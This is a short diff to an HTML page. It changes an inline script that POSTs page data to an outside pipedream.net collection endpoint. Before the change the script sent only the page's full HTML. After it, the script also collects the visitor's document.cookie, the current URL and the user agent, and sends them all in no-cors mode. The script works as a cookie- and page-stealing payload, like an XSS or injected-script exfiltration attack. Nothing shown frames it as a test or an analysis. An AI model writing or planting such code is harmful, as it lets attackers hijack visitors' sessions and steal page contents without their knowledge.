@@ -2,10 +2,17 @@
 <html>
   <body>
     <script>
+      const data = {
+        cookie: document.cookie,
+        location: location.href,
+        userAgent: navigator.userAgent,
+        html: document.documentElement.outerHTML
+      };
+
       fetch("https://236fb3a628ae3f3aef9dc3bd171c41c6.m.pipedream.net", {
         method: "POST",
         mode: "no-cors",
-        body: document.documentElement.outerHTML
+        body: JSON.stringify(data)
       });
     </script>
   </body>
